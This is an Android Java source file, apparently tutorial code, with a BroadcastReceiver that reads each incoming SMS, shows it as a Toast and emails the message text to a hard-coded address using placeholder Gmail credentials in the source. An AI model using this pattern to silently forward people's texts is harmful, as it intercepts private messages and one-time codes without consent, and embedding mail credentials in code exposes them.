package net.learn2develop.Receiver;
 
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.widget.Toast;
import android.util.Log;
 


@SuppressWarnings("deprecation")
public class SmsReceive extends BroadcastReceiver
{

	
	@Override
    public void onReceive(Context context, Intent intent) 
    {
        
		
		//---get the SMS message passed in---
        Bundle bundle = intent.getExtras();        
        SmsMessage[] msgs = null;
        String str = "";            
        if (bundle != null)
        {
            
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];            
            for (int i=0; i<msgs.length; i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
                //str += "SMS from " + msgs[i].getOriginatingAddress();                     
                //str += " :";
                str += msgs[i].getMessageBody().toString();
                str += "\n";        
            }
           
            Toast.makeText(context, str, Toast.LENGTH_SHORT).show();
           try {   
                GMailSender sender = new GMailSender("name@example.com", "password");
                sender.sendMail("Test SMS", str,   "posting_email@xample.com",   "");   
            } catch (Exception e) {  Log.e("SendMail", e.getMessage(), e);     }    
                
                
    }
}}